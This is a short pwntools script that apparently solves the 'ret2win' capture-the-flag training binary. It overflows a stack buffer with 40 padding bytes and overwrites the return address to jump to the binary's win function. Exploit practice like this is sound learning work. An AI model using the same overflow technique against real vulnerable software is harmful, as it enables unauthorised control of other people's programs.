#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./ret2win")
    ret2winaddr = p64(e.symbols["ret2win"])

    ''' Create buffer '''
    buf = "A" * 40

    io = e.process()
    io.sendline(buf + ret2winaddr)
    print(io.recvall())

if __name__ == '__main__':
    pwn()
